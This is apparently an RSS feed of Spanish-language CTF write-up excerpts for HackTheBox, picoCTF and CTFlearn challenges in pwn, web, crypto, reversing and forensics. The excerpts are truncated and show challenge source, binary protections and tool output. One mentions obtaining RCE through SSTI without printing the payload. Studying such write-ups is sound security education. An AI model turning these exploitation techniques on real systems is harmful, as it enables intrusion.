▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓░▒▓▓▓░░░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒░▓▓▓░░░░ ▓▓ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 1.</description></item><item><title>Space pirate: Going Deeper</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-going-deeper/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-going-deeper/</guid><description>Se nos proporciona un binario de 64 bits llamado sp_going_deeper:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Si lo ejecutamos, tenemos tres opciones:
$ ./sp_going_deeper Trying to leak information from the pc.. 🖥️ ____________________________________________________ / \ | _____________________________________________ | | | | | | | goldenfang@d12:$ history | | | | 1 ls | | | | 2 mv secret_pass.</description></item><item><title>Space pirate: Retribution</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-retribution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-retribution/</guid><description>Se nos proporciona un binario de 64 bits llamado sp_retribution:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si abrimos el binario en Ghidra veremos esta función main:
void main() { char local_b[3]; setup(); banner(); while (true) { while (true) { printf(&amp;amp;DAT_00101f68, &amp;amp;DAT_00100d78); read(0, local_b, 2); if (local_b[0] != '1') break; show_missiles(); } if (local_b[0] != '2') break; missile_launcher(); } printf("</description></item><item><title>Space Pirates</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/space-pirates/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/space-pirates/</guid><description>Se nos proporciona el siguiente código en Python:
from sympy import * from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randint, randbytes, seed FLAG = b'HTB{dummyflag}' class Shamir: def __init__(self, prime, k, n): self.p = prime self.secret = randint(1, self.p - 1) self.k = k self.n = n self.coeffs = [self.secret] self.x_vals = [] self.y_vals = [] def next_coeff(self, val): return int(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) def calc_coeffs(self): for i in range(1, self.</description></item><item><title>Spellbook</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/spellbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/spellbook/</guid><description>Se nos proporciona un binario de 64 bits llamado spellbook:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
void main() { size_t option; setup(); banner(); while (true) { while (true) { while (option = menu(), option == 2) { show(); } if (option &amp;lt; 3) break; if (option == 3) { edit(); } else { if (option !</description></item><item><title>Spellbook</title><link>https://7rocky.github.io/ctf/other/htb-unictf/spellbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/spellbook/</guid><description>Se nos proporciona un binario de 64 bits llamado spellbook:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
void main() { size_t option; setup(); banner(); while (true) { while (true) { while (option = menu(), option == 2) { show(); } if (option &amp;lt; 3) break; if (option == 3) { edit(); } else { if (option !</description></item><item><title>Spellbound Servants</title><link>https://7rocky.github.io/ctf/htb-challenges/web/spellbound-servants/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/spellbound-servants/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos del código fuente de Python del servidor (Flask).
En primer lugar, podemos registrar una nueva cuenta e iniciar sesión:
Y llegamos a esta página:
¡No hay más funciones! Entonces, analicemos el código fuente.
Análisis del código fuente Estos son los endpoints disponibles (blueprints/routes.py):
from application.database import * from flask import Blueprint, redirect, render_template, request, make_response from application.util import response, isAuthenticated web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.</description></item><item><title>SpellBrewery</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/spellbrewery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/spellbrewery/</guid><description>Se nos proporcionan los siguientes archivos:
$ file * SpellBrewery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0ee68cb419f7329a3bd027c947654385d416143a, not stripped SpellBrewery.deps.json: JSON data SpellBrewery.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows SpellBrewery.runtimeconfig.json: JSON data Hay un binario ELF y una DLL de Windows. Si miramos las strings del binario, veremos que carga la DLL:
$ strings SpellBrewery | grep -i dll This executable is not bound to a managed DLL to execute.</description></item><item><title>SPG</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/spg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/spg/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from hashlib import sha256 import string, random from secret import MASTER_KEY, FLAG from Crypto.Cipher import AES from Crypto.Util.Padding import pad from base64 import b64encode ALPHABET = string.ascii_letters + string.digits + '~!@#$%^&amp;amp;*' def generate_password(): master_key = int.from_bytes(MASTER_KEY, 'little') password = '' while master_key: bit = master_key &amp;amp; 1 if bit: password += random.choice(ALPHABET[:len(ALPHABET)//2]) else: password += random.choice(ALPHABET[len(ALPHABET)//2:]) master_key &amp;gt;&amp;gt;= 1 return password def main(): password = generate_password() encryption_key = sha256(MASTER_KEY).</description></item><item><title>Spiky Tamagotchi</title><link>https://7rocky.github.io/ctf/htb-challenges/web/spiky-tamagotchi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/spiky-tamagotchi/</guid><description>Se nos proporciona el código fuente de un proyecto web en Node.js con Express JS y MySQL.
Análisis del código fuente En el Dockerfile se utiliza el siguiente script entrypoint.sh:
#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize &amp;amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 &amp;amp; # Wait for mysql to start while ! mysqladmin ping -h'localhost' --silent; do echo "</description></item><item><title>Spookifier</title><link>https://7rocky.github.io/ctf/htb-challenges/web/spookifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/spookifier/</guid><description>Se nos proporciona esta página web:
Podemos introducir un texto cualquiera y será mostrado en diferentes fuentes:
Análisis de código estático Tenemos el código fuente en Python de la aplicación web, hecha con Flask. Este archivo es application/blueprints/routes.py:
from flask import Blueprint, request from flask_mako import render_template from application.util import spookify web = Blueprint('web', __name__) @web.route('/') def index(): text = request.args.get('text') if text: converted = spookify(text) return render_template('index.html', output=converted) return render_template('index.</description></item><item><title>Spookifier</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/spookifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/spookifier/</guid><description>Se nos proporciona esta página web:
Podemos introducir un texto cualquiera y será mostrado en diferentes fuentes:
Análisis de código estático Tenemos el código fuente en Python de la aplicación web, hecha con Flask. Este archivo es application/blueprints/routes.py:
from flask import Blueprint, request from flask_mako import render_template from application.util import spookify web = Blueprint('web', __name__) @web.route('/') def index(): text = request.args.get('text') if text: converted = spookify(text) return render_template('index.html', output=converted) return render_template('index.</description></item><item><title>SpookTastic</title><link>https://7rocky.github.io/ctf/htb-challenges/web/spooktastic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/spooktastic/</guid><description>Se nos proporciona el siguiente sitio web:
También tenemos el código fuente en Python del servidor (Flask).
Análisis del código fuente El archivo relevante es app.py:
import random, string from flask import Flask, request, render_template, abort from flask_socketio import SocketIO from threading import Thread app = Flask(__name__) socketio = SocketIO(app) registered_emails, socket_clients = [], {} generate = lambda x: "".join([random.choice(string.hexdigits) for _ in range(x)]) BOT_TOKEN = generate(16) def blacklist_pass(email): email = email.</description></item><item><title>Spooky RSA</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/spooky-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/spooky-rsa/</guid><description>Se nos proporciona el siguiente código en Python para cifrar la flag:
from Crypto.Util.number import bytes_to_long, getStrongPrime from random import randint FLAG = b'HTB{????????????????????????????????????????????}' def key_gen(bits): p, q = getStrongPrime(bits), getStrongPrime(bits) N = p * q return N, (p, q) def encrypt(m, N, f): e1, e2 = randint(2, N - 2), randint(2, N - 2) c1 = (pow(f, e1, N) + m) % N c2 = (pow(f, e2, N) + m) % N return (e1, c1), (e2, c2) def main(): N, priv = key_gen(1024) m = bytes_to_long(FLAG) (e1, c1), (e2, c2) = encrypt(m, N, priv[0]) with open('out.</description></item><item><title>Spooky RSA</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/spooky-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/spooky-rsa/</guid><description>Se nos proporciona el siguiente código en Python para cifrar la flag:
from Crypto.Util.number import bytes_to_long, getStrongPrime from random import randint FLAG = b'HTB{????????????????????????????????????????????}' def key_gen(bits): p, q = getStrongPrime(bits), getStrongPrime(bits) N = p * q return N, (p, q) def encrypt(m, N, f): e1, e2 = randint(2, N - 2), randint(2, N - 2) c1 = (pow(f, e1, N) + m) % N c2 = (pow(f, e2, N) + m) % N return (e1, c1), (e2, c2) def main(): N, priv = key_gen(1024) m = bytes_to_long(FLAG) (e1, c1), (e2, c2) = encrypt(m, N, priv[0]) with open('out.</description></item><item><title>Spooky Safebox</title><link>https://7rocky.github.io/ctf/other/hack.lu-ctf/spooky-safebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hack.lu-ctf/spooky-safebox/</guid><description>Se nos proporciona el código fuente del servidor en Python. Este archivo es app.py:
#!/usr/bin/env python3 import secrets import os, sys, hmac import cryptod from proofofwork import challenge_proof_of_work FLAG = os.environ.get("FLAG", "flag{FAKE_FLAG}") if "flag" in os.environ.get("FLAG","") else "flag{FAKE_FLAG}" def main(): print("Welcome to the Spooky Safebox!") if not challenge_proof_of_work(): return kpriv, kpub = cryptod.make_keys() order = cryptod.get_order() encrypted_flag = cryptod.encrypt(kpub, FLAG) print("Here is the encrypted flag:", encrypted_flag) print("You've got 9 signatures, try to recover Satoshi's private key!</description></item><item><title>Spooky Time</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/spooky-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/spooky-time/</guid><description>Se nos proporciona un binario de 64 bits llamado spooky_time:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si lo abrimos en Ghidra, veremos esta función main:
void main() { long in_FS_OFFSET; char first_input[12]; char second_input[312]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); banner(); puts("It\'s your chance to scare those little kids, say something scary!\n"); __isoc99_scanf("%11s", first_input); puts("</description></item><item><title>Spooky Time</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/spooky-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/spooky-time/</guid><description>Se nos proporciona un binario de 64 bits llamado spooky_time:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si lo abrimos en Ghidra, veremos esta función main:
void main() { long in_FS_OFFSET; char first_input[12]; char second_input[312]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); banner(); puts("It\'s your chance to scare those little kids, say something scary!\n"); __isoc99_scanf("%11s", first_input); puts("</description></item><item><title>Spybug</title><link>https://7rocky.github.io/ctf/htb-challenges/web/spybug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/spybug/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente de la aplicación web en Node.js y el código fuente de un agente en Go.
Análisis de código fuente La aplicación web está construida con Express JS. En index.js Podemos ver una cabecera de Content Security Policy (CSP) y una función visitPanel que se ejecuta cada minuto:
application.use((req, res, next) =&amp;gt; { res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';"</description></item><item><title>SpyBug</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/spybug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/spybug/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente de la aplicación web en Node.js y el código fuente de un agente en Go.
Análisis de código fuente La aplicación web está construida con Express JS. En index.js Podemos ver una cabecera de Content Security Policy (CSP) y una función visitPanel que se ejecuta cada minuto:
application.use((req, res, next) =&amp;gt; { res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';"</description></item><item><title>St3g0</title><link>https://7rocky.github.io/ctf/picoctf/forensics/st3g0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/st3g0/</guid><description>Tenemos una imagen PNG llamada pico.flag.png:
Como el reto se llama St3g0, parece que la imagen tiene datos ocultos mediante esteganografía. Podemos utilizar zsteg para mostrar la flag:
$ zsteg pico.flag.png b1,r,lsb,xy .. text: "~__B>wV_G@" b1,rgb,lsb,xy .. text: "picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}$t3g0" b1,abgr,lsb,xy .. text: "E2A5q4E%uSA" b2,b,lsb,xy .. text: "AAPAAQTAAA" b2,b,msb,xy .. text: "HWUUUUUU" b2,a,lsb,xy .. file: Matlab v4 mat-file (little endian) &amp;gt;&amp;lt;?P, numeric, rows 0, columns 0 b2,a,msb,xy .. file: Matlab v4 mat-file (little endian) | &amp;lt;?</description></item><item><title>Stonks</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/stonks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/stonks/</guid><description>Se nos proporciona el código fuente en C de un binario. El código es relativamente largo, por lo que se muestra la función más interesante:
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;time.h&amp;gt; #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int buy_stonks(Portfolio *p) { if (!p) { return 1; } char api_buf[FLAG_BUFFER]; FILE *f = fopen("</description></item><item><title>Substitution Cipher</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/substitution-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/substitution-cipher/</guid><description>Se nos proporciona este texto cifrado:
MIT YSAU OL OYGFSBDGRTKFEKBHMGCALSOQTMIOL. UTFTKAMTR ZB DAKQGX EIAOF GY MIT COQOHTROA HAUT GF EASXOF AFR IGZZTL. ZT CTKT SGFU, MIT YSACL GF A 2005 HKTLTFM MODTL MIAF LMADOFA GK A CTTQSB LWFRAB, RTETDZTK 21, 1989 1990, MIT RKTC TROMGKL CAL WHKGGMTR TXTKB CGKSR EAF ZT YGWFR MIT EGFMOFWTR MG CGKQ AM A YAOMIYWS KTHSOTL CITKT IGZZTL, LMBST AOD EASXOF, AMMAEQ ZGMI LORTL MG DAKQL, "</description></item><item><title>Sum-O-Primes</title><link>https://7rocky.github.io/ctf/picoctf/cryptography/sum-o-primes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/cryptography/sum-o-primes/</guid><description>Tenemos la salida de un cifrado RSA:
x = 17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a Contexto de RSA También se nos proporciona el código fuente para generar esta salida. Ahí, podemos ver que $x = p + q$, $n = p q$ y $c$ es el texto cifrado. El exponente $e = 65537$.
RSA funciona de manera que, dado un mensaje $m$ en formato decimal, podemos cifrarlo como sigue:</description></item><item><title>Symbols</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/symbols/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/symbols/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from secret import FLAG from random import randint p = 307163712384204009961137975465657319439 g = 1337 def encrypt(m): bits = bin(m)[2:] encrypted = [] for b in bits: r = (randint(2, p) &amp;lt;&amp;lt; 1) + int(b) encrypted.append(pow(g, r, p)) return encrypted def main(): flag = int.from_bytes(FLAG, 'big') encrypted_flag = encrypt(flag) with open('output.txt', 'w') as f: f.write(str(encrypted_flag)) if __name__ == '__main__': main() Y también tenemos la salida del script:</description></item><item><title>Taking LS</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/taking-ls/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/taking-ls/</guid><description>Se nos proporciona un archivo ZIP que contiene estos archivos y directorios:
$ unzip -l The\ Flag.zip Archive: The Flag.zip Length Date Time Name --------- ---------- ----- ---- 0 10-30-2016 14:45 The Flag/ 6148 10-30-2016 14:45 The Flag/.DS_Store 0 10-30-2016 14:46 __MACOSX/ 0 10-30-2016 14:46 __MACOSX/The Flag/ 120 10-30-2016 14:45 __MACOSX/The Flag/._.DS_Store 0 10-30-2016 14:40 The Flag/.ThePassword/ 42 10-30-2016 14:41 The Flag/.ThePassword/ThePassword.txt 16647 10-30-2016 14:45 The Flag/The Flag.pdf 177 10-30-2016 14:45 __MACOSX/The Flag/.</description></item><item><title>Tapping</title><link>https://7rocky.github.io/ctf/picoctf/cryptography/tapping/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/cryptography/tapping/</guid><description>Se nos proporciona un mensaje raro a través de nc:
$ nc jupiter.challenges.picoctf.org 9422 .--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ..--- -.... ---.. ...-- ---.. ..--- ....- -.... .---- ----- } Ncat: Broken pipe. Vemos que el mensaje solamente tiene . y - (y también llaves, lo cual indica que el mensaje podría ser la flag).</description></item><item><title>Tear or Dear</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/tear-or-dear/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/tear-or-dear/</guid><description>Tenemos un archivo Windows PE llamado TearOrDear.exe:
$ file TearOrDear.exe TearOrDear.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows Si lo ejecutamos en una máquina Windows, veremos esta ventana con un formulario:
Descompilación de C# .NET Dado que está compilado con C# .NET, podemos usar herramientas como JetBrains dotPeek, dnSpy o ILSpy para descompilar el ejecutable y obtener casi el mismo código fuente C# original.
Esta vez, el código es realmente feo (lo dejaré aquí, pero no es necesario entenderlo todo):</description></item><item><title>Teleport</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/teleport/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/teleport/</guid><description>Se nos proporciona un binario llamado teleport:
$ file teleport teleport: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1f87fe68fd7d1deaffefcf08ed2b30d660ee2d0b, stripped Si lo ejecutamos, nos pregunta por una contraseña:
$ ./teleport Missing password Podemos probar a añadirla como argumento de línea de comandos:
$ ./teleport asdf Something's wrong... $ ./teleport 'HTB{asdf}' Something's wrong... Con ltrace podemos ver que nuestra entrada se copia en una dirección de memoria y luego hay un montón de saltos (44 llamadas a _setjmp):</description></item><item><title>Templated</title><link>https://7rocky.github.io/ctf/htb-challenges/web/templated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/templated/</guid><description>Se nos proporciona una página web hecha en Flask:
Si probamos una ruta cualquiera, se refleja en el documento HTML:
Por tanto, puede ser vulnerable a Server-Side Template Injection (SSTI). Vamos a probar con {{7*7}}:
Y de hecho es vulnerable, ya que aparece 49. Ahora, podemos ir a PayloadsAllTheThings y coger otro payload de SSTI para obtener ejecución remota de comandos (Remote Code Execution, RCE) en el servidor:
Finalmente, tenemos la flag (HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!</description></item><item><title>Testimonial</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/</guid><description>Se nos proporciona el siguiente sitio web:
Además, tenemos un endpoint de gRPC en 94.237.49.166:58578.
También se nos proporciona el código fuente del proyecto en Go.
Análisis del código fuente Este es el archivo principal (main.go):
package main import ( "embed" "htbchal/handler" "htbchal/pb" "log" "net" "net/http" "github.com/go-chi/chi/v5" "google.golang.org/grpc" ) //go:embed public var FS embed.FS func main() { router := chi.NewMux() router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS)))) router.Get("/", handler.MakeHandler(handler.HandleHomeIndex)) go startGRPC() log.Fatal(http.ListenAndServe(":1337", router)) } type server struct { pb.</description></item><item><title>The Magic Informer</title><link>https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/</guid><description>Tenemos este sitio web:
Esta vez no tenemos el código fuente, por lo que debemos dar vueltas con el sitio web.
Registrando una nueva cuenta En la parte inferior de la página podemos encontrar un enlace a un formulario de registro:
Entonces nos registramos y luego iniciamos sesión:
Y tenemos acceso a nuestro dashboard:
Navegación de directorios y lectura de archivos locales Podemos probar inyecciones comunes en la en el formulario anterior.</description></item><item><title>The Magic Informer</title><link>https://7rocky.github.io/ctf/other/htb-unictf/the-magic-informer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/the-magic-informer/</guid><description>Tenemos este sitio web:
Esta vez no tenemos el código fuente, por lo que debemos dar vueltas con el sitio web.
Registrando una nueva cuenta En la parte inferior de la página podemos encontrar un enlace a un formulario de registro:
Entonces nos registramos y luego iniciamos sesión:
Y tenemos acceso a nuestro dashboard:
Navegación de directorios y lectura de archivos locales Podemos probar inyecciones comunes en la en el formulario anterior.</description></item><item><title>The Office</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/the-office/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/the-office/</guid><description>Se nos proporciona un binario de 32 bits llamado the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) El reto dice que han implementado un heap seguro utilizando canarios (heap canaries).
No disponemos del código en C. Por tanto, necesitamos utilizar una herramienta de ingeniería inversa como Ghidra.
Aunque el archivo ha sido despojado de los símbolos:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.</description></item><item><title>The secret of a Queen</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/the-secret-of-a-queen/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/the-secret-of-a-queen/</guid><description>Se nos proporciona una imagen con unos símbolos raros:
El nombre del reto es una pista, ya que se está utilizando el cifrado de la reina María de Escocia. El cifrado se basa en la sustitución de letras por símbolos utilizando el siguiente alfabeto:
Si traducimos cada símbolo de la imagen a una letra, obtenemos la flag: HTB{THEBABINGTONPLOT}.</description></item><item><title>The Three-Eyed Oracle</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/the-three-eyed-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/the-three-eyed-oracle/</guid><description>Se nos proporciona el siguiente código en Python:
